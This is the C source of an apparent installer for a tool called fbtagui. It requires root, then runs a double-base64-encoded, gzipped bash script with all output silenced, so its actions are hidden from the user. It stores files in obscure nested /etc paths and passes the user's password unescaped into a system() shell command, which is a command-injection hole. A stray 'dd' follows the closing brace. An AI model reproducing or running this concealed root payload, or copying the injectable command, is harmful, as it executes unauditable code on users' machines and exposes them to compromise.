#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <pthread.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>

// Darakubalika

volatile bool loading_done = false;
volatile bool interrupted = false;
char download_speed[256] = "";
pid_t child_pid = 0;

void sigint_handler(int sig) {
    interrupted = true;
    loading_done = true;
    if (child_pid > 0) kill(child_pid, SIGTERM);
    printf("\nCanceled. Press enter to exit.\n");
}

void *loading_dewanti(void *arg) {
    const char *spinner = "|/-\\";
    int i = 0;
    while (!loading_done) {
        printf("\rLoading... [ %c ] | Speed: %s ", spinner[i++ % 4], download_speed);
        fflush(stdout);
        usleep(200000);
    }
    printf("\r                                             \r");
    return NULL;
}

void *net_tx(void *arg) {
    while (!loading_done) {
        FILE *fp;
        char buffer[256];

        const char *cmd =
            "awk -v eth=\"$(echo $(ip route | grep default | sed -E 's@default via [0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+@default@' | awk '{print $3}' | sed '1!d') lo | awk '{print $1}')\" 'function f(b){return b>=1073741824?sprintf(\"%.2f GiB/s\",b/1073741824):b>=1048576?sprintf(\"%.2f MiB/s\",b/1048576):b>=1024?sprintf(\"%.2f KiB/s\",b/1024):sprintf(\"%.2f B/s\",b)} BEGIN{while((getline<\"/proc/net/dev\")>0)if($0~eth){r1=$2} close(\"/proc/net/dev\"); system(\"sleep 1\"); while((getline<\"/proc/net/dev\")>0)if($0~eth){r2=$2} close(\"/proc/net/dev\"); printf \"%s\", f(r2-r1)}'";

        if ((fp = popen(cmd, "r")) == NULL) {
            perror("Failed to setup");
            break;
        }

        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
            buffer[strcspn(buffer, "\n")] = 0;
            snprintf(download_speed, sizeof(download_speed), "%s", buffer);
        }

        pclose(fp);
        sleep(1);
    }
    return NULL;
}

bool net_test() {
    return system("getent hosts google.com > /dev/null 2>&1") == 0;
}

bool root_test() {
    return getuid() == 0;
}

void interrupted_exit() {
    if (interrupted) {
        printf("Stopped.\n");
        exit(0);
    }
}

int main() {
    if (!root_test()) {
        printf("This program requires root access. Please run as root.\n");
        return 1;
    }

    signal(SIGINT, sigint_handler);

    char dewanti[10];
    printf("Hi, Setup online fbtagui v1.0.0\n\nFollow me on:\nTwitter/X: @darakubalika\ninstagram: @pebwe_\ngithub: darakubalika\n\nStart setup? [y/N] : ");
    if (fgets(dewanti, sizeof(dewanti), stdin) == NULL) return 1;
    interrupted_exit();

    dewanti[strcspn(dewanti, "\n")] = 0;
    for (int i = 0; dewanti[i]; i++) dewanti[i] = tolower(dewanti[i]);

    if (strcmp(dewanti, "y") == 0) {
        if (!net_test()) {
            printf("Check your network connection.\n");
            return 1;
        }

                pthread_t loading_thread, network_thread;

        int pre_setup_status = system("echo Checking...");
        if (pre_setup_status != 0) {
            printf("Stopped\n");
            return 1;
        }
        loading_done = false;
        pthread_create(&loading_thread, NULL, loading_dewanti, NULL);
        pthread_create(&network_thread, NULL, net_tx, NULL);
        child_pid = fork();

        if (child_pid == 0) {
            freopen("/dev/null", "w", stdout);
            freopen("/dev/null", "w", stderr);
            execlp("/usr/bin/bash", "bash", "-c", "bash <(echo 'SDRzSUFBQUFBQUFBQThWNjM1T3J1SkxtKy80VjlUVHpkUG9nTURYSE1SRWJXOWdJakkxY0NQMEF2UUhpR0J1Qk9UYTJNVEd4Zi91bQorM1J2OTczVGMrOUU3TU0rdU1vbEN5bVYrZVdYWDZwY0RPUGJseS9majlPWDhuSnU2Lzd0MkYvSHdwaTNMOCszZjM4cjROUGZCODVECjNaZm42VzA4OXFQOTFsenI4WEkrai9Ebm9iN2MrK29Mek9wMVljNTkvZVVLSS9YbDdYb2I0TTN4ZXI2OEhjNm02QTlmRHVlMzczWHoKZHBpUHc5djB2YW9YWDhiNjBoMzd3cndkcXVxdHI4Y3Y0L2xzcm05amMrdUx5MDhqdWxZZjRlM3c5blhzaHErNmZoVDllSVR4U3YvdAp5TC84QzJ6ejFwMDFtSHdjMzhyYjBlamZCZy8xK0hZNHdxTGxMOVc1KzNxbzZ4WlpDSDJ0aSt2elMzOEc4Ly9YSGYyQ2ZyRittLy96CjJTL250Ni9sc2YvVHJIK3l5RStqL3ZmZjJQeHkwbGQ0b1A5K1BIejk2YnQvZjZ1cjV2ejJyK21hemluSFh2TDdpN1dUWlBGelowZjcKd3Q5Y1l1YTdTZXY2RkdPdm1MMjVaaCtPOFBWbjRTY1BiYW0yQ0N0THlnblZRY08xWlN3aHFPS2Q0YncxdTRycDl6aTkzc25Id0dwdQpybXorc0xXRlQ3clZxMzNHYmZLOG9sU3FXejdEZVV6K3BJSGU3L21nWUowbmxXWXJPaGNWMWhnd016aWlRd0ZIWGxOakhKUjI4eW40CnQ3bnd4elV6NHFxWnVGR204NVZSZTNHaXJXZ2JSL1prMGlmdm5kczByTEFIMFVtUThKZGQ3Sk5yYVdpYjJNdW80dE01TVVhV0RMZmwKTENJWlJJSWg0NVNPNXhhQk85QVRqbktwblVwZWJZSlZzWE9NMHQxMVM1RG5FSTdmNjlVeXlEdHpJYjZpMnptK2NLNkRuVTJmR2lsTApPQVorRHUreWkrN3MxQ3hTNlJhRjN5aG1HYTdsdUJDbzJmS1dJeHJTcHBMVkl4WERsUVM2RVhLOEpOWTNwSlBCMXNjbGd1YzkyVWFaCmJvYzk3M0pVOU5TUFJYU25yUjZyckxVWk90dWxFVDNybzl1ZTA2SnVzUlBqMkdYSDBWTzIydGRkNVBOTSt5eklGNGxVYnVrZm52b0UKZTZQbXlhMklyVnJkay9iYlJkbVRTT1IxVVljZmJvSGl1eEI0aWkxWHBkYkk2ajZmU2V1K1lyZlcvcmd0K2crMG14c3ZGc05GZ2sycQp4Nnh1M1U4aER4T2RoVmNZMWVkU0tOS3JDN2NWSTVodmxTRnIzUm1yRk5oV2xuNFhwNmpKa1VseWJybzhYVHFsUHhqcG8xU3Y2VkFGClV3dXd3OHFZUG9hblN0d1FtVVVMbVhtZnBSOFZSVnRkdEJ3ZXNtM3VCSm16ZHFLTk5wakZIOE5HdFloWG9tRkttRkZtNnJxMXplZCsKalorOGkwNUo3N3RsT3JyQ0lac2tIZGVKczVuaURwK2s4RExBWWJOejlEWHRoRmZaYUwrMThFUDZXT3pEWVNwQ2s1TytlU1lPWFFsTwoxYXBYSnUyaVJlcEh2Z3kwbmE2K1dTckVaaStVakUrbVMxbnpXV2I0RTN4MEt6SnVGZjdnMEpOWTdETkQ4dlNLOHZuanJqdXlxdWJrCm1RdGw3eVdTckZWaE5aUHJubWs3Yng4UEVnRE9ERWw0UjNlcTkxYU1lZS9wS1hJMTBnR3pMY0RhRkZhdEhsallvdFF4Kzl6V1dXb0oKd21DdmVJNW9IQkt1Y2Y0VTJIZDFoMGU5TmxuU0QwL1o4UWVielNuR3VOTWNUZVhIZ0NzV3NSSU5aeGJnWjlWaEhuZERVQVlpWXUwNApKS2ZHQVN5RnlYTjVUek45NHNjUjE2WXhkTVozMmVhUE9IQ1BxUlVsUXBxaWNBQkNtVUc4MVFMOGVxMUQvdzZ4eG9WODJLc1dlK0k1CjlocEZqOFNxWE5FTjIwSjRIZ3NzaS9wMHJReUZQVTJyTEJWWHAyaXMvYzBqOVhPN0RyNHRjamsrbFM5dXVSQlhidEcwRnI1TjFxcXIKQkwwVWpyK29NaEx1TTQzcmtHOHJSSHpHOVU2OS9KRFJiVzVQVzlGN3dGL2lQUVZPMnN2cVdmWE5aeUxQRCtwdlVJbFZBdkZhMWUxMAo1Y3d6Y1RDWjFLa0ErK1FIeFEzamJhU2tHTTVndzBKM1M0Zkk1Yk04bkpFMHBvbFp0S2RjM1ZQaFQyWDZiVTZCaTJJcmVsZkg1YnAwCktJNU5CWGwvdnRBT1NOR09Wc3kvV3RTbXUwSTJWMkZhbE12b21DS0JLSW9TbmVXUHJSUHRHWHB4YkRWWGxzbFdwMmJJa2NnVHB4blYKYkc3S3AwWFNSNVBNTktGK2pyaEZJc0Q5S2hkTkFubEpxa3pORUJPYjlCK3o0ckdyUTNPaDFtaXF0ZWZ2VitPRnR0RVpPS1VIamx1dwoxbjNQWmJOUXordVdaMlFsK21nbnNnSFFSN0NRamEvV1RWejVmSXJiYjR2cVJIZWxyeHZKdkkzc28yZmx3eGtjdFVwUEh4TjNJZ1k4Ck1EUDdPdFh5Mjh5TTcrU3pVckpGdEFoMXlqcGdZTXRseFdNUUJUT0UrMHNya1dPNmRmQzREOHlwQ0hJbjdhYXo3TXdPMW5tV0djMXkKSjhyVGpxTThVMDBaNklXVXlwUno1REhUT01scE0rZVpkOVVuRlJXb2VlZU9SdFNvblBLbEJJeEVLK00veVdxSkt0UW9IZnFUNm5SYgpRZTRBZDV5RjdacGlYVDNFY2J5WG1ja0FDNGpZNmw2Z1laTWZ4MDNSUnlOdjZUdVQrclRIMk5SZGRjbk5FQmYyb0lDYkVkaDhZeXgyCktVKzJkV2ZOZXUyWkZKT3JaSkREUW9UeGM3eHAzdXh6ZytjOEhYZEZGNFhTSjRIc3hFQXlHck5nbVNRdDFKUVpId1dPT3BFQlE0WkQKV25KSWRBZEh6RHBiVEpoc2h4TEFSTE1qandId2hPTTB3OFBXNW5lT0lQL0V3VWx0OFU0c3RTN2EvRUpQM3BBSTNGWkliU3JXZExSdgpDdTZQVVcyMDNIT010VC9FSlNOTkF2bVpDSzhwQWh3bngyVXVEYzVqRTQwU0MzZlZDWmRrM2pOM21xMlNKR1JPZm1IQU03d25RK0hRCjU1N3J6N2luM2o3QVI5S2JkWDJLcnV4RTdYMHdxVFRraXpwckxHNXBoOG5Ob3pUa3VQY3BpN0VLcWl4cWlVUUJNSDhVbzNaYkNxUEsKSHR1NTFWeWdvaXhVS0d4dHRCMGZydzdqVThlNkplU2Z1bkt1TXRscnY0UTh6QzJjUUlaTVplc3ZJRThhRlJxYmh4LzNtQTkrd2dRSAozaHBUcnJkMThMQnAvL0VBbkYxSU91YkY3RjlrY0owcWUzalgxZ09SZE5tV1NFekFqKzhxVkhCT1JSaWlIWEdJbjhoOGd0Z1N1alpyCnhieVVaUDVjbjBSY01NVjJNOTFVM2VCRHZDK0pwRC80R3Yrb1lIeGw4TFJ6cUVuWDBTSzN6Z3Z0QXlkM0R5dkd4TmtIWjZ0eUNFczYKUEFqUlRFbEdBVytZaUxscGhFODVEdzVXMmc1SkhJaWJQQzZmb2x0QzJEVkpqQ2YydUFIRU5oaDhOUlp0dkUxTWJnay9lcGR0OG1EUwpQY1lJNHNqSDkxeVFheTArRUo5YkcycjBwWkE0QVE1OUozS3dVeFFOVUxlZU9hZnJLdk55RFZ5WE95b3VndVY3MlRkZDVlY09DWWFNCkc4d2g1b2drZzZYUm9CTFRqSVYxY1BnNmVjaXUyYVFuN1lwZ21IaUFJSnJrVkovTVZqMlhqS1ZqSW55ejQ0d2FKdHBMZ3FJVE4vNkMKeVcvQTVaTXRBcldIOVN6R1hTY09ock1TbVBLT0xGYXRlRzV0VFlBallZNjdTQ3o2MEt0bHczM3VzbmI1M0tKaEVTTytJQm5VaU5uSQp0RHM0Z0xXbjVzWkp1c1VkdEY4dmpzdE5sWTVjOTNyTjRUSHdkMTRFR3JTcnYveE0vdlh0UDk3SzRscS9MOTYrNkw5N2Y3ajFMOG4vCjlqLy9TZy8vL0hsNXFlYy82ZWJiOWZMMTJoU1grbXRaVk8zaGNyNzErdXRMWUE5dlh5Ny9jSmsvUGZyemc5OGFoRi8rMk9lbi9wWU8KUVZVZ25xQ041dEtKMml3WmJxVk5HeVhSdlR3aHErcUZXZlhlb0FJMWxBRmZBdWJHYXJXY2RlYVpxbGREWlMrZmF1VStDcGxzeTJEWgpxODVjUVdUZVZTRHNuYTNhM2V6L01TNldZNTQxeHpxanBwcXR4Nm9YczhvMnk2cGIzdlhIZVNzZDcxbmErcGxMNjcxZSt4UFk4cWc2CmM0ZVhWVE9ZMzVGN0tWRlRkZ25ZSWVicXVEd1djbkdYSVIyVS9UcURlOXFzVUtzeWN0SEI4ckZaUlg2ZVJRM29nbU11cDZHdy9lTW0KOUJySURlZDFWdnE3clJrOTdaeURveG1aZDdaL3IrenFYdlN4Qzdwd3JnTmk0dWZTalkvTGhjNzh3MDVPOTl6R1Y4RHlyRmNmWTlXcApZeFVzbi9CK2prLytGQjgvUm02TGs4NmlBZW9mcjE5K2VucXk3SWluTTNvRys3d3kxRTJkRVFaYytGUXlPZXc0UHVXMmVFQU5OVFVYCnRwS3VWVDAveGtTU2s4bzhpd2ZMb2V6QlorMWZmR1lMaXdaaUJwNjhWNWdNZGNjUE8wRk0yZEUxN0FkTTFsaXZQYUVxbXlyODA5ajYKRFA3RXdMSVF2NHhZNENmck00UGVRWUtHY1doYk9zTEs3T2tPR3Y1bjNHMXFvSFozYXZWdFd2WEEvc0VTYWJ5OFFyeTZRazRtczFGVApCNkFQd1paUDlyR3RPdEVXV1dSeWgzNS9yYWV5NlBuNytpc3pRbHlYUFdpOWNkOFRvMWZJZ2ZoY3F3QS9ZSjcrYzV3cit3QStqdytSCm84K3ZmVGJocjJ2ODJ5YWc5MDJnVEFFeDJNbW8zOG1YblkvRGI3aVlmL1Z0dW9TNGs0dHlvcnVXYnZzNmc0SXpsMkZ5SzNxdjM2enkKYmhNMmdEZTNyWTZ2ZFNBWCtzaVVmWEw0UElKR0R0QURuaGtxeDd2bW1YbWRvNEdxZFBnZVBnNUZDSGFIMGIxMElINFoyQXZhY2JQYQpuR0lXUDJLR1Q1dlQ5VkRaazFIWnh5Rm0xd1A0NjZiU0NuamZ0Y0V2OTdKRHIzMlcxRGVNKzVNbm1mVU8vVU1EOFFHOGkxbUQvWHI5CmUvNzlaMzkvUWoxUldYNVhYWEtQa3dIbUF6NzY2UHRmNStCbXV6cVNzZ0o3d1JkTnlRWjRWamVBcVNGTHppY1lIeUFmQUsvdE12NDQKQXhhWFl5bnhUYTJ0NCtad1B2MWptMkYrSml4NDNyejhVOEhuNEJla1h1ditNeHdkeWN2dU81ejUrMy9KRVVjQ09RSXg2Q0NuOFBLMwpjMjUrMytOdk9FTkpQTmNwdXBVTzlQVEkydjd0dVlaVGFhUHhGV3Z3SGFxY3pSMTY1OXZPRnNBSDdWaDJTN3ZzNHNNdUJlRVcwQ2ZrCngyTFBmT0FRYS95WjZ4NzRub0FlYk83VksrWXBlc0Rha0VmeE0yYis4eld2N0w2TmtQZlhYZllIeC93Yy8zWHRFZkFOZHFJWmVPbVYKYzY5Y0JlNFRJMmgxc3puOFA4WCtIL3NRTUswQ0EzNGtWdWE4MWhQUDZuZHVQd3gveHNVZGFzRXQ3NWFMditQZTZiL2kzdEx4Z0d1aQplNzFDd09Wa0x1VHlCbnJ1QnZVRTR1S09MNzc2NURUaXlJc1QwUzczcDQvdFgrUGxMODd4ZDNYa1ArTkpmQWVjTHZMZVdDcUxYekgrCmIyTkZCK2FtMThBMXZmY0VtNTlGUnQxUDVtLy93RDZ5Q3JBOVBneUFlYWh6M2ZKV1NqalhHdm1wSUFuenNmcGsvOTg0OUcrRkJraUsKZXF5Ky9uSFhxSDlWQmYvZ2tpMS9jZ2NhUG1qWUUwTTNZSkNkT3Q0UExVQk1oNXFBQUZqRW1ONVVlSGd3YUNoSzdPMFNQdGpKU1RVeQpVeUF0OFp4YTJ1ZXpDbG1ZVDhvYzdpL2h1N09qYTdWV045MGJ2MEptcWsza0tqbWVPU0o5WWsvUEF2dFBFTksybHNONVp5OG5LUnRYCkdVeXEyWFFDYTAvUEd2T1RXZFVzK2xHdGlWc0h6YkhDZ3VWZFk4SHgzVnJpNThwNHR1aEJIQnB2UWEwbEk1YnJ4MzBGQWxwZGhSMGQKdVd3bmFIQmJ6czExYXcycDZCQ05MVG9RR2EwVE15aDFVaGRvOGo1MWk5OVpOLzJnUWJTdUxIU2svbmdFMFJpblJqMjUxVzRMbnJpRQo0MEFJOVlqeDhLU25BNGhEOHFQQ0VhMXNHQXVicUFnUHJwQ2JPOHU4bGU2Yks1QnF3dm1ZNXAzaWF2YTZWQ0pWeThwT2VjUDMwSXpXCmtpVFVkM0hzR0lkYjBGZ25RNXdZN1ZaaUtMVDFFaUI0RHlBN0Vxem52YWp1NEFOQkhUTnU3ZXBaODBaQ0FpMjBiTHEwZlZpcHBielkKbUc1ckxhYlNWaUFTM0UxNW91djgxQ3p5OXJHb1JkUnhIcDJwaksxVlMwRllrMTlGNm45RG92NEdwMGtmdnY1MjRmMjFxL3ZiTDFObgovaStrL21uOU8zNTBmd2ZTdjFpMnVJM242MWhjeG44QTFRUEFKTXArM2djbkYySS8zQnFyRmpUN1hHVWErR0VJSVRjS3huRXFlN0pLCmdJc0tvYUgzSTVRaUxMUXZVdGxGYTJoeHQ3bThXZ0lOeVQ0NXU4WGF1M0xISzRBRE9qcEhRZG9yVjl1VXF1QThLOWFZN1F4ZGhDUVAKRW95ZlhEWm5ZUzJ2UERPS3pZbkwvVzhQZ01xV3lUUEtlMDhKUG93MTA5REx4RGFYVVZoSStxaTUzcTlhdlZOOVpaT2VKdVhwQUZCdgpaTDF1dXJMTG4ybWdqNjg3bE5qL1p0V2h4N1R0L3BEK0ZCV1NyT1RhaTZRMGNlRnZwanBRZWJ6bTl0Ni9QdWhxakJOdVVORXVwMXpHClRtSkhQZlRsMjdKRks5NDNuQnJ2ck96b1VmR2x0UThNakpPZ2JqVlBXeXpUUHIvSUZnbUZGSU8reHlFdDJSV1luR09MR01ISHFIVE0KVmx0MEIrbXlBU2kxNUpSQWJBbUQvaHd4aEJmcFkzRExVM1FUMEljeVdUMmhZYnlYZkZEeGFybmczWmdXNER0b3MyVFN0cUJIeHlibgo0a3k2K0xKUGw5Y1VxRkl5dlZMcmFBL3BibWdXdmU2cHh3UjZ5Y0kydThMeFJHcUlTbnFUcjlxeHBTMjZwNzdpaFEyOXR6RmtaK05qCnlkMXJLa2RWQ2hLem5sdDVINjBxMzcrdzJidndIaiswVFc2cFV5RVJKby9LVUlzNTRpSjZFNG8xRGZNT2lPM2tXNncvMzh2K2pFUjcKMkhLZjVuV3Zwa0ljTG1sSWVPd0RMek9kSnUzUzRabDY2SUIwZFR0RWFYQ3cxWWw2KzR5RVZYaDJVdVRoUFc4UndjT2sxbm9qR0lkWQpORXJOeXFvN2QrUzlYdFd0dTJYcGNpZ2U1NmZNaGwyZUhaRGcwUXRQME8wM2RuMktGL3NRcjh0QWhjVEpuM3RHTVVTRUppZHZBWGhzCndlY0Y3elpBZHliVXJMMFVvbkpncHB0THpjSGZvQmFhcnVqd2o1VEQvc1l6cTlaTVFwQ2g2SmFiM09BVHRVd0htUEtaaFNIUEtDYVoKS0ZnZ3J1RFRoSWpvQnRyZ3dSR09nRlpYcElzb25UVlBCRTVZSCswRlVsYnNxM2ZWVVJPMzAyZHNJc0QzdzluNzM3YXNXejZKTXlBTgpzdUYxUDV0YVV5OTZvU0NQZ3RSM2c3UWpydXlHZTd6V2ZTcndHZnFpSmtINlU0Y3hTZ08zaTUwUGg0YjRkZi9SRlQxM05KOTYxYXRjCnplS1QrcTBGNVNJa2grRXNNYjVEZjk4SVJ6OUtnU0cvOVdjOHY3RG5qalUzZ0tPbVNXeGt4MWc3Y1R0ZzJwRWRsVzVSQmxRcU0vd0EKMnQwem15REl0VEF4UGlwUHhDOThzOUtJUm9MSDFoNFByNTVXQ0E2NXdWRW11THZWOXRCU09aRGFKSmZjR2o2SkZCaDYwenZObWwwcQpoTkVXMnNBTGczWnhpWDJBY2htbFdoQk9VWFRNSGVHbWxrbnBPbnI5NTJXc2ZkOUsra0ZWUHQvbUhNZmFwMC9oaTRSWllxT3N3MlhQCjNWdGhsRW9jRCswRHZhRzRldlZ2aXlMMGJxLy9wNEZ1SU5wM254Ui9nQzhiVkZtYlMrRTB3MTRrOTFTS2JvZlVxV3Jwb2dwZk9GQkkKSk9kSDBYMXpjejZkK1VuSEZXcUdjaDE1aERWSzJMR2RHL0dNcldVc1FzZzV4L1NLcVpqWTQ4aDhzaEZCRThpT3lwVDVpNkt6SHBLUgpIUXZjUUxNb2owLzRXYXlqNjNadW9kUk9xMVZmSVJhWWEzRmN4bVU3UG5VbUV0RUQ3N2JUVkxTa2ozbGl4ZXRreWp1c2dIdW54R211ClJkZEVwVkdma09lTHFvdCtKRnowT2hqY3JVMHZ6SkFqK09SZVdmbFQrbVFRNlVpSTNXNjFVVEdYUzEvd1pjRnR5eWJDV3pIZi9jRkQKQXRqMWxBb1NPN1VYbGc2OTk5VEhZYmsrekZVUThkZWRMV0FwMXdLTHZLZGRJalhhemw2MkR4WlBLU2RlTWZWZUJHNE8vTGRsanpNaQpDUGJwaFIrdnhsbjN3NTFueEllZTN4RFE0SUFmUmUwWTdmMTJ3WkMrY2U1Q3JucEdNaHJWRW5Wa2JZNjV0ZHhvWDExVU8wQStOZGM0CkV5Rm9VYmRxeDRVS0psOUxKVmNuc3dEOWFndEgrTVNlckMyaWFTcjB2c2dHditwSlVXT3pqU1VjT0ZpK0s2Tm5idEZRYzdTSFh1WEsKNUhJcjFqcUNuSnZLR1RyZ0FIK1NOZjdNMi9ORmhXWmlKeld4TEZtVTltSEwyb2dTN0oxMWNGNEFEaU8xTnF1ODE0Uks2N2tGOVF2OApGTkRPbU5Ub0g3RTVURkNuOE03Qk84Q1AyYzNrR3ZlS0ExUWQwdEZRbktKUEdrQk1lc2kvYnZDaGptU0F0NmorR0F6OFhzZU9TRlhuCnRxa1pWbXFPcm15MTNGQS8yakRXOE5yZ1FTUHZDRnlPU0had0ZNTlR2ZmFTclRNY29ZNG9HcmhoRlV6bmZUQmkzbjI3Z09ScGxPTTcKYlBYTlNwSHlvZjBpb0trak5tTlYrbXFUQSsrbU9IN1dBUTFqWVpnMlhxRFhCNmZtbXpuMkI1ZFo2Z3JjK1FreWJLSlE0NVNjQW9nLwpjSXg0ZjhsV0hVQjhoSDZJRUtkVmQ3V0xYcTIyTCt6SWRxdHcxQ25yak1xNXlZV01qaXdZQjkxT2VjNUhIR2NibXhzMWwxYkR0T1UrClMyZllGYUcvNEZudWNqdTZhQjVOYVRmbURQa1dOMDJhK3JHVDJqaGx3SEt5RlhZYUxOeDRCbzN4T0U5UW4rL01INk9xVzh5MDN6ekUKRFBIZ0pLaU12bkFNekM2alQySHhPWlhmTGx0RUxnbXZuaW5DTjc3R0hzbTRYVmdvZ0RodGlwTTQ3U3h5SWF1UmNSN1B6Rkg3ZlNqeQptcXRpMVMyRHhFUWJZTUI3WVVRSGN0Tlh4K1U1YjRtaHMrY0tSSU9xNVc1KzB1LzBwQzBHRmFrVUJrUFF2ZitlSkh6ZEtMNitDZkM5CkhJdGZYaGVJcjI4cnZMNGU4T2NQL21MYXBYdjdjdm4rRngvOGNjLzVxeXo4dDV0ei9WcDh2UjYrbnE1TCtEMVZ0ZlAxYVgvOUgvOEgKQk9oM1hwOGhBQUE9' | base64 -d | base64 -d | gunzip)", NULL);
            perror("Error setup.");
            exit(1);
        } else if (child_pid > 0) {
            pthread_create(&loading_thread, NULL, loading_dewanti, NULL);
            pthread_create(&network_thread, NULL, net_tx, NULL);

            int status;
            waitpid(child_pid, &status, 0);
            loading_done = true;

            pthread_join(loading_thread, NULL);
            pthread_join(network_thread, NULL);

            interrupted_exit();

            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                printf("Setup is Complete\n");
                char pass[100];
                while (1) {
                    printf("\nSet your password.\nCreate a password: ");
                    if (fgets(pass, sizeof(pass), stdin) == NULL) pass[0] = '\0';
                    interrupted_exit();

                    pass[strcspn(pass, "\n")] = 0;

                    char *start = pass;
                    while (isspace((unsigned char)*start)) start++;
                    char *end = pass + strlen(pass) - 1;
                    while (end > start && isspace((unsigned char)*end)) *end-- = '\0';

                    if (*start == '\0') {
                        printf("Invalid password, please try again\n");
                        continue;
                    }

                    memmove(pass, start, strlen(start) + 1);
                    break;
                }

                char cmd[256];
                snprintf(cmd, sizeof(cmd), "echo -n \"%s\" | vncpasswd -f > /etc/x7u3s/a/sg/js9a/sxce3/y2/xuq", pass);
                printf("Done.\n");
                system(cmd);

                char input[10];
                int awkokw = 0;
                while (!interrupted) {
                    printf("1. Start\n2. Exit\nChoose (1/2): ");
                    if (fgets(input, sizeof(input), stdin) == NULL) break;
                    interrupted_exit();

                    awkokw = atoi(input);
                    if (awkokw == 1) {
                        printf("\nWait..\n");
                        system("cd ~ && nohup /usr/bin/supervisord -c /etc/supervisord.conf > /dev/null 2>&1 & echo $! > /etc/x7u3s/a/sg/js9a/sxce3/y2/uvc");
                        sleep(2);
                        printf("Done. Check in your browser with the address http://{IP ADDRESS}:8910 or use your domain with port 8910, then use the command 'fbta -h'\n");
                        break;
                    } else if (awkokw == 2) {
                        printf("Use the command 'fbta start' to start, 'fbta stop' to stop and others can use 'fbta -h'\n");
                        break;
                    } else {
                        printf("Invalid, please select between 1 and 2\n");
                    }
                }

                interrupted_exit();
            } else {
                printf("The update process failed or was canceled..\n");
            }
        } else {
            perror("fork failed");
            return 1;
        }
    } else {
        printf("Cancled.\n");
    }

    return 0;
}dd
